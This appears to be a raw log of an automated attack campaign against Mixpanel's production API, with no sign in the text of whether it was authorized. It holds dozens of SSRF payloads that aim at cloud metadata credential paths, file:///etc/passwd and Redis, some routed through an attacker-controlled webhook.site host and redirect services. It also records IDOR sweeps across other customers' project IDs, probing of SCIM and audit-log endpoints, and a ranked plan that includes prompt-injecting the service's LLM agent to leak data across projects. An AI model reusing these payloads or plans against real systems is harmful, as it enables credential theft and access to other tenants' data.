[18:40:14] ATTACK-PRIVESC: GET /api/app/organizations/3100781/settings: MEMBER=404/82 ADMIN=404/82 
[18:40:15] ATTACK-PRIVESC: GET /api/app/organizations/3100781/billing: MEMBER=404/81 ADMIN=404/81 
[18:40:16] ATTACK-PRIVESC: GET /api/app/orgs/3100781/billing: MEMBER=404/72 ADMIN=404/72 
[18:40:18] ATTACK-PRIVESC: GET /api/app/projects/4025923/data_volume: MEMBER=404/80 ADMIN=404/80 
[2026-05-30T18:40:20Z] RECON-ENDPOINTS:   PROBE /embed/4025923/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:21Z] RECON-ENDPOINTS:   PROBE /public/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:40:21] ATTACK-PRIVESC: GET /api/app/projects/4025923/data_quality: MEMBER=404/81 ADMIN=404/81 
[2026-05-30T18:40:22Z] RECON-ENDPOINTS:   PROBE /p/dashboard/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:22Z] RECON-ENDPOINTS:   PROBE /p/board/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:23Z] RECON-ENDPOINTS:   PROBE /embed/board/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:40:24] ATTACK-PRIVESC: GET /api/app/projects/4025923/workspaces: MEMBER=403/116 ADMIN=403/68 
[2026-05-30T18:40:25Z] RECON-ENDPOINTS:   PROBE /api-docs -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:26Z] RECON-ENDPOINTS:   PROBE /swagger -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:26Z] RECON-ENDPOINTS:   PROBE /swagger.json -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:27Z] RECON-ENDPOINTS:   PROBE /openapi.json -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:40:28] ATTACK-SSRF: PROBE[baseline] url=https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/baseline → 200 body[200]={"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[2026-05-30T18:40:29Z] RECON-ENDPOINTS:   PROBE /api/swagger -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:40:29] ATTACK-SSRF: PROBE[imds-v1] url=http://169.254.169.254/latest/meta-data/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:30] ATTACK-SSRF: PROBE[imds-v1-iam] url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:30] ATTACK-PRIVESC: GET /api/app/projects/4025923/team_members: MEMBER=404/81 ADMIN=404/81 
[18:40:31] ATTACK-SSRF: PROBE[imds-decimal] url=http://2852039166/latest/meta-data/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:32] ATTACK-SSRF: PROBE[imds-hex] url=http://0xa9fea9fe/latest/meta-data/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:33] ATTACK-IDOR: FLAG SUSPICIOUS_200_JSON: MEMBER→ADMIN GET https://mixpanel.com/api/app/projects/4025923/dashboards status=200 len=794
[2026-05-30T18:40:33Z] RECON-ENDPOINTS:   PROBE /api/docs -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:34Z] RECON-ENDPOINTS:   PROBE /graphql -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:40:34] ATTACK-SSRF: PROBE[imds-ipv6] url=http://[::ffff:169.254.169.254]/latest/meta-data/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:35] ATTACK-SSRF: PROBE[imds-nip] url=http://169.254.169.254.nip.io/latest/meta-data/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[2026-05-30T18:40:36Z] RECON-ENDPOINTS:   PROBE /api/graphql -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:40:37] ATTACK-SSRF: PROBE[imds-trailing] url=http://169.254.169.254./latest/meta-data/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[2026-05-30T18:40:38Z] RECON-ENDPOINTS:   PROBE /api/app/graphql -> 404 loc=- ct=application/json len=59
[18:40:38] ATTACK-PRIVESC: GET /api/app/projects/4025923/members: MEMBER=404/76 ADMIN=404/76 
[18:40:39] ATTACK-IDOR: FLAG EXACT_MATCH_OWNER_DATA: MEMBER→ADMIN GET https://mixpanel.com/api/app/projects/4025923/cohorts status=200 len=31
[2026-05-30T18:40:40Z] RECON-ENDPOINTS:   PROBE /api/3.0/graphql -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:40:41] ATTACK-PRIVESC: GET /api/app/projects/4025923/users: MEMBER=404/74 ADMIN=404/74 
[18:40:41] ATTACK-SSRF: PROBE[gcp-meta] url=http://metadata.google.internal/computeMetadata/v1/instance/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:41] ATTACK-SSRF: PROBE[azure-meta] url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:43] ATTACK-PRIVESC: GET /api/app/projects/4025962: MEMBER=404/68 ADMIN=404/68 
[18:40:43] ATTACK-SSRF: PROBE[localhost] url=http://127.0.0.1/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:44] ATTACK-SSRF: PROBE[localhost-0] url=http://0.0.0.0/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:44] ATTACK-IDOR: FLAG SUSPICIOUS_200_JSON: MEMBER→ADMIN GET https://mixpanel.com/api/app/projects/4025923/webhooks status=200 len=328
[18:40:45] ATTACK-SSRF: PROBE[localhost-6] url=http://[::1]/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:46] ATTACK-SSRF: PROBE[redis] url=http://127.0.0.1:6379/ → 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:40:47] ATTACK-SSRF: PROBE[file] url=file:///etc/passwd → 500 body[200]={
  "status": "error",
  "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 29
[18:40:48] ATTACK-SSRF: PROBE[gopher] url=gopher://127.0.0.1:6379/_INFO → 500 body[200]={
  "status": "error",
  "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 55
[18:40:49] ATTACK-SSRF: PROBE[oast-aws-tag] url=https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/aws-imds-attempt → 200 body[200]={"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[18:40:58] ATTACK-IDOR: FLAG EXACT_MATCH_OWNER_DATA: MEMBER→ADMIN GET https://mixpanel.com/api/app/projects/4025923/bookmarks status=200 len=23487
[2026-05-30T18:41:00Z] RECON-ENDPOINTS: STEP 2 — download JS bundles
[2026-05-30T18:41:00Z] RECON-ENDPOINTS:   18 mixpanel-owned bundles to download
[2026-05-30T18:41:01Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js -> 103897 bytes -> mixpanel-2-latest.min.js
[2026-05-30T18:41:01Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/PnPwvjnvq63Fmno_i7oMq/_buildManifest.js -> 18420 bytes -> _buildManifest.js
[2026-05-30T18:41:02Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/PnPwvjnvq63Fmno_i7oMq/_ssgManifest.js -> 381 bytes -> _ssgManifest.js
[2026-05-30T18:41:02Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/2288-823df22a3fde6cc4.js -> 13579 bytes -> 2288-823df22a3fde6cc4.js
[2026-05-30T18:41:03Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/2757-d165f8d3e51344ab.js -> 69260 bytes -> 2757-d165f8d3e51344ab.js
[2026-05-30T18:41:03Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/5570-6e6d2238b87d8c56.js -> 10658 bytes -> 5570-6e6d2238b87d8c56.js
[2026-05-30T18:41:06Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/5581-049bd50141a7e823.js -> 93492 bytes -> 5581-049bd50141a7e823.js
[2026-05-30T18:41:06Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/6134-e44b3c7320d7d4fd.js -> 38432 bytes -> 6134-e44b3c7320d7d4fd.js
[2026-05-30T18:41:06Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/7162-cee10e4c92394489.js -> 9815 bytes -> 7162-cee10e4c92394489.js
[2026-05-30T18:41:07Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/8624-31c05e9fe735a949.js -> 7911 bytes -> 8624-31c05e9fe735a949.js
[2026-05-30T18:41:07Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/9894-da6b07bdbd79277c.js -> 6819 bytes -> 9894-da6b07bdbd79277c.js
[2026-05-30T18:41:08Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/framework-d57fa332274b7d65.js -> 140040 bytes -> framework-d57fa332274b7d65.js
[2026-05-30T18:41:09Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/main-29771fd7f201b0cc.js -> 118870 bytes -> main-29771fd7f201b0cc.js
[2026-05-30T18:41:10Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/pages/_app-30065074a8f69b05.js -> 246895 bytes -> _app-30065074a8f69b05.js
[2026-05-30T18:41:10Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/pages/new-login-7737eaee6bcb7290.js -> 21849 bytes -> new-login-7737eaee6bcb7290.js
[2026-05-30T18:41:10Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/pages/new-request_access-eca8a39a822a894a.js -> 8641 bytes -> new-request_access-eca8a39a822a894a.js
[2026-05-30T18:41:11Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/polyfills-42372ed130431b0a.js -> 112541 bytes -> polyfills-42372ed130431b0a.js
[2026-05-30T18:41:11Z] RECON-ENDPOINTS:   GOT https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/webpack-df1e720a3aa0a77d.js -> 5073 bytes -> webpack-df1e720a3aa0a77d.js
[18:41:21] ATTACK-IDOR: FLAG EXACT_MATCH_OWNER_DATA: MEMBER→ADMIN GET https://mixpanel.com/api/app/projects/4025923/playlists status=200 len=31

### DOCS INTEL (2026-05-30T18:50Z — fetched from docs.mixpanel.com)

#### High-value attack surfaces confirmed by docs:

**1. Cohort-Sync Webhooks (SSRF candidate)**
- Server fires POST JSON to user-supplied URL
- Docs do NOT mention URL validation / RFC1918 blocking
- HOWEVER live testing (ATTACK-SSRF in this log) shows ALL IMDS variants return 400 "Failed to send test webhook request"
- → server IS blocking link-local/RFC1918 at some layer; bypass via DNS rebinding / HTTP redirect chain / IPv6 may still work
- Retries: 5x over 60s with exp backoff on 5xx/429
- Auth: optional Basic auth (no HMAC signing)

**2. SCIM Endpoint (CONFIRMED)**
- Path: `https://mixpanel.com/api/app/scim/v2`
- Enterprise-only; token shown once
- Standard SCIM surface: /Users, /Groups, /Users/{id} PATCH
- CVE-2025-41115 Grafana pattern: externalId injection → privesc
- Cross-tenant SCIM token reuse → mass IDOR

**3. SSO / JIT Provisioning**
- JIT users auto-added with NO project perms (matches our MEMBER session)
- Domain claim via DNS TXT `mixpanel-domain-verify=<token>`
- Domains unverify after 1 week if TXT removed → TOCTOU between unverify and re-claim?
- Owner/Admin password fallback EVEN when SSO required → policy bypass surface

**4. Mixpanel Agent (LLM = Claude)**
- Tool calling: create reports/cohorts/boards, search project data, analyze replays
- "Your data stays within your existing access" — claim to verify by prompt-injecting cross-user access
- MCP server exists (/docs/mcp navigation entry) — separate attack surface
- Endpoint NOT in docs — need to discover

**5. Audit Log**
- Org-admin / project-admin only (matches `view_audit_logs` perm)
- Org-only events: service account mgmt, login/logout, 2FA — extra-sensitive
- Docs claim NO API endpoint — undocumented endpoint highly likely
- Retention: 90d free, 2y enterprise

**6. Public Boards & Embeds**
- oEmbed format used for embeds
- URL format NOT documented — possibly predictable/sequential
- Disabling "turns off ALL" → but does URL remain valid after re-enable?
- Plan-gated: Growth/Enterprise only

**7. Roles model**
- Org Member with 0 perms = exactly our MEMBER session in org 3100781
- "All roles are additive and strictly give permissions" — never deny
- "Classified Data Access" not default for anyone → bypass = huge bug
- No explicit programmatic invite/transfer documented (suggests they exist, undocumented)

### NEW ATTACK PRIORITIES (added 18:50Z)
- **P0** Webhook SSRF: DNS rebinding + HTTP redirect bypass (IMDS direct blocked)
- **P0** SCIM /Users mass assignment + cross-tenant
- **P0** Mixpanel Agent prompt injection → cross-project data leak
- **P1** Audit log API discovery + MEMBER bypass
- **P1** Public board URL enum + post-private-disable persistence
- **P1** Owner/Admin password fallback when SSO required

### ATTACK-SSRF EARLY OBSERVATION (18:40Z)
- baseline webhook.site URL → 200 "success: true, status_code: 200" — confirms webhook FIRES server-side
- ALL IMDS direct hits → 400 "Failed to send test webhook request" — RFC1918/link-local blocked at fetch layer
- NEXT: DNS rebinding, HTTP 30x redirect chain to IMDS, IPv6 link-local alternatives, gopher://, file://
[18:41:40] ATTACK-IDOR: FLAG EXACT_MATCH_OWNER_DATA: MEMBER→ADMIN GET https://mixpanel.com/api/app/projects/4025923/annotations status=200 len=31
[2026-05-30T18:41:46Z] RECON-ENDPOINTS: STEP 3 — mine JS for API paths and secrets
[2026-05-30T18:41:46Z] RECON-ENDPOINTS:   api_app: 4, api_vN: 0, api_query: 0, graphql: 0, embed: 6, generic_api_like: 7, secrets: 1
[18:42:10] ATTACK-SSRF: PROBE[whatwg-bs-at] http://9a80587a-10b4-4350-97b2-6121770760eb-c1.webhook.site\@169.254.169.254/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "url: &#x27;http://9a80587a-10b4-4350-97b2-6121770760eb-c1.webhook.site\\\\@169.254.169.254
[18:42:11] ATTACK-SSRF: PROBE[whatwg-bs-dot] http://example.com\.169.254.169.254/ → 400 {"status": "error", "error": "url: &#x27;http://example.com\\\\.169.254.169.254/&#x27; is not a &#x27;uri&#x27;", "detai
[18:42:12] ATTACK-SSRF: PROBE[square-localhost] http://[localhost]/ → 400 {"status": "error", "error": "url: &#x27;http://[localhost]/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"fo
[18:42:13] ATTACK-SSRF: PROBE[protorel-bs] \\169.254.169.254/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "url: &#x27;\\\\\\\\169.254.169.254/computeMetadata/v1/instance/&#x27; is not a &#x27;uri&#
[18:42:14] ATTACK-SSRF: PROBE[userinfo-evil] http://169.254.169.254@metadata.google.internal/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:16] ATTACK-SSRF: PROBE[userinfo-mix] http://metadata.google.internal@webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/userinfo-test → 200 {"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[18:42:17] ATTACK-SSRF: PROBE[fragment-at] http://metadata.google.internal#@webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/frag-test → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:20] ATTACK-SSRF: PROBE[tripleslash] http:///metadata.google.internal/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:27] ATTACK-SSRF: PROBE[mix-slash] http:/\metadata.google.internal/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "url: &#x27;http:/\\\\metadata.google.internal/computeMetadata/v1/instance/&#x27; is not a 
[18:42:28] ATTACK-SSRF: PROBE[gcp-short] http://metadata/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:29] ATTACK-SSRF: PROBE[gcp-short-svc] http://metadata.google.internal./computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:31] ATTACK-SSRF: PROBE[gcp-aws-alias] http://metadata.aws.internal/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:32] ATTACK-SSRF: PROBE[gcp-dec] http://2852039166/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:33] ATTACK-SSRF: PROBE[gcp-oct] http://0251.0376.0251.0376/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:34] ATTACK-SSRF: PROBE[gcp-hex] http://0xa9fea9fe/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:35] ATTACK-SSRF: PROBE[gcp-ipv6] http://[::ffff:169.254.169.254]/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:36] ATTACK-SSRF: PROBE[gcp-ipv6-hex] http://[::ffff:a9fe:a9fe]/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:37] ATTACK-SSRF: PROBE[gcp-zero] http://0/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:38] ATTACK-SSRF: PROBE[gcp-zero-port] http://0:80/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:39] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025923 dashboards 200 len=811
[18:42:40] ATTACK-SSRF: PROBE[gcp-localhost] http://localhost.localdomain/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:40] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025924 dashboards 200 len=31086
[18:42:41] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025925 dashboards 200 len=31086
[18:42:41] ATTACK-SSRF: PROBE[localtest-me] http://localtest.me/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:42] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025930 dashboards 200 len=31086
[18:42:42] ATTACK-SSRF: PROBE[nip-127] http://127.0.0.1.nip.io/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:43] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025940 dashboards 200 len=31086
[18:42:43] ATTACK-SSRF: PROBE[nip-169] http://169.254.169.254.nip.io/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:44] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025941 dashboards 200 len=31086
[18:42:44] ATTACK-SSRF: PROBE[nip-meta] http://metadata.google.internal.nip.io/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:45] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025942 dashboards 200 len=31086
[18:42:45] ATTACK-SSRF: PROBE[sub-localhost] http://localhost.webhook.site/ → 200 {"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[18:42:46] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025943 dashboards 200 len=31086
[18:42:46] ATTACK-SSRF: PROBE[crlf] https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/crlf%0d%0aHost:%20169.254.169.254 → 200 {"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[18:42:47] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025950 dashboards 200 len=31086
[18:42:48] ATTACK-SSRF: PROBE[gcp-meta-port-80] http://metadata.google.internal:80/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:48] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025960 dashboards 200 len=31086
[18:42:48] ATTACK-SSRF: PROBE[space] http://169.254.169.254 .nip.io/ → 400 {"status": "error", "error": "url: &#x27;http://169.254.169.254 .nip.io/&#x27; is not a &#x27;uri&#x27;", "details": {"s
[18:42:49] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025961 dashboards 200 len=31086
[18:42:50] ATTACK-SSRF: PROBE[nat64] http://[64:ff9b::a9fe:a9fe]/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:42:50] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025962 dashboards 200 len=811
[18:42:52] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025970 dashboards 200 len=31086
[18:42:54] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025974 dashboards 200 len=31086
[18:42:55] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4025980 dashboards 200 len=31086
[18:42:56] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4026000 dashboards 200 len=31086
[18:42:57] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4027000 dashboards 200 len=31086
[18:42:58] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4027263 dashboards 200 len=811
[18:42:59] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4027264 dashboards 200 len=31086
[18:43:00] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4027268 dashboards 200 len=31086
[18:43:00] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4027269 dashboards 200 len=811
[18:43:01] ATTACK-IDOR: SWEEP-HIT: ADMIN→pid=4027270 dashboards 200 len=31086
[18:43:02] ATTACK-IDOR: BYPASS-HIT: ADMIN https://mixpanel.com/api/app/projects/4025942/dashboards?project_id=4025923 status=200 len=31086
[18:43:03] ATTACK-IDOR: BYPASS-HIT: ADMIN https://mixpanel.com/api/app/projects/4025942/dashboards/ status=200 len=31086
[18:43:06] ATTACK-IDOR: BYPASS-HIT: ADMIN https://mixpanel.com/api/app/projects/4025942/dashboards/. status=200 len=31086
[18:43:06] ATTACK-SCIM: UNAUTH GET / -> 404 len=59
[18:43:07] ATTACK-SCIM: UNAUTH GET /Users -> 401 len=232
[18:43:08] ATTACK-SCIM: UNAUTH GET /Groups -> 401 len=232
[18:43:08] ATTACK-SCIM: UNAUTH GET /ServiceProviderConfig -> 200 len=823
[18:43:09] ATTACK-SCIM: UNAUTH GET /ServiceProviderConfigs -> 200 len=823
[18:43:10] ATTACK-SCIM: UNAUTH GET /ResourceTypes -> 200 len=844
[18:43:10] ATTACK-SCIM: UNAUTH GET /Schemas -> 200 len=8130
[18:43:11] ATTACK-SCIM: UNAUTH GET /Bulk -> 404 len=64
[18:43:11] ATTACK-SCIM: UNAUTH GET /Me -> 404 len=62
[2026-05-30T18:43:11Z] RECON-ENDPOINTS: STEP 4 — probing 314 endpoint candidates
[18:43:21] ATTACK-IDOR: END session. flagged=9 sweep_hits=22
[18:43:31] ATTACK-PRIVESC: DELETE /api/app/projects/4025923 body=None: MEMBER=404 | {"status": "error", "error": "Not found: /api/app/projects/4025923"}
[2026-05-30T18:43:48Z] RECON-ENDPOINTS:   GET /api/app/me -> 200 len=20937 '{"status": "ok", "results": {"date_joined_iso": "2026-05-19T13:06:10", "is_staff'
[18:43:48] ATTACK-SSRF-BYPASS: == DISCOVERY: locate webhook /test endpoint ==
[18:43:49] ATTACK-SCIM: SESS ADMIN GET /Users -> 401 len=130
[18:43:49] ATTACK-SSRF-BYPASS: DISC POST https://mixpanel.com/api/app/projects/4025923/webhooks/test -> 401 {"status": "error", "error": "You must provide an Authorization header. E.g. 'Authorization: Bearer your-access-token' o
[18:43:50] ATTACK-SCIM: SESS ADMIN GET /Groups -> 401 len=130
[18:43:55] ATTACK-SSRF-BYPASS: DISC POST /mixpanel.com/api/app/projects/4025923/webhooks/test-webhook -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/test-webhook"}
[18:43:55] ATTACK-SSRF-BYPASS: DISC POST s/4025923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8/test -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8/test"}
[18:43:56] ATTACK-SSRF-BYPASS: DISC POST ojects/4025923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8 -> 405 
[18:43:57] ATTACK-SCIM: SESS ADMIN GET /Users?count=1 -> 401 len=130
[18:43:58] ATTACK-SCIM: SESS ADMIN GET /Users?filter=userName co "" -> 401 len=130
[18:43:58] ATTACK-SCIM: SESS MEMBER GET /Users -> 401 len=130
[18:43:59] ATTACK-SCIM: SESS MEMBER GET /Groups -> 401 len=130
[18:44:00] ATTACK-SCIM: SESS MEMBER GET /Users?count=1 -> 401 len=130
[18:44:02] ATTACK-SCIM: SESS MEMBER GET /Users?filter=userName co "" -> 401 len=130
[18:44:03] ATTACK-SCIM: SESS IDOR GET /Users -> 401 len=130
[18:44:05] ATTACK-SCIM: SESS IDOR GET /Groups -> 401 len=130
[18:44:06] ATTACK-SCIM: SESS IDOR GET /Users?count=1 -> 401 len=130
[18:44:07] ATTACK-SCIM: SESS IDOR GET /Users?filter=userName co "" -> 401 len=130
[18:44:10] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/scim/tokens -> 404
[18:44:13] ATTACK-SSRF: PROBE[r3dir-302-gcp] http://r3dir.me/?url=http://metadata.google.internal/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:44:14] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/scim/enable -> 404
[18:44:15] ATTACK-SSRF: PROBE[r3dir-302-gcp-ip] http://r3dir.me/?url=http://169.254.169.254/computeMetadata/v1/instance/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:44:15] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/organizations/3100781/scim/tokens -> 404
[2026-05-30T18:44:16Z] RECON-ENDPOINTS:   GET /api/app/organizations/3100781/audit-logs -> 405 len=0 ''
[18:44:18] ATTACK-SSRF: PROBE[r3dir-307-gcp] http://307.r3dir.me/?url=http://169.254.169.254/latest/api/token → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:44:18] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/organizations/3100781/scim -> 404
[18:44:20] ATTACK-SSRF: PROBE[r3dir-302-aws] http://r3dir.me/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:44:20] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/organizations/3100781/scim/v2/Users -> 404
[18:44:22] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/organizations/3100795/scim/v2/Users -> 404
[18:44:22] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/scim/v2/Users?org_id=3100781 -> 401
[18:44:27] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/scim/v2/Users?org_id=3100795 -> 401
[18:44:30] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/scim/service-account -> 404
[18:44:31] ATTACK-SCIM: ADMIN-TOKEN-GEN GET /api/app/scim/service-accounts -> 404
[18:44:33] ATTACK-SSRF: PROBE[r3dir-301-az] http://301.r3dir.me/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:44:35] ATTACK-SSRF: PROBE[httpbin-redir-gcp] https://httpbin.org/redirect-to?url=http://metadata.google.internal/computeMetadata/v1/instance/&status_code=302 → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:44:37] ATTACK-SSRF: PROBE[httpbin-redir-aws] https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/&status_code=302 → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:44:40] ATTACK-SSRF: PROBE[nip-127-1] http://127.1.1.1.nip.io/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:44:42] ATTACK-SSRF: PROBE[aws-internal] http://169.254.169.254.xip.io/ → 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:45:19] ATTACK-SSRF-BYPASS: == BYPASS-V2: sanity baseline + redirect-chain + rebinder + edge cases ==
[18:45:22] ATTACK-SSRF-BYPASS: PROBE[baseline-v2] url=https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/baseline-v2-873c27b0 -> 200 body[200]={"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[18:45:23] ATTACK-SSRF-BYPASS: PROBE[redir-bin-200] url=https://httpbin.org/redirect-to?url=https://webhook.site/9a80587a-10b4-4350-97b2-612177076 -> 200 body[200]={"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[18:45:25] ATTACK-SSRF-BYPASS: PROBE[redir-bingo-200] url=https://httpbingo.org/redirect-to?url=https://webhook.site/9a80587a-10b4-4350-97b2-6121770 -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:45:27] ATTACK-SSRF-BYPASS: PROBE[redir-bin-imds] url=https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/&status_code=3 -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
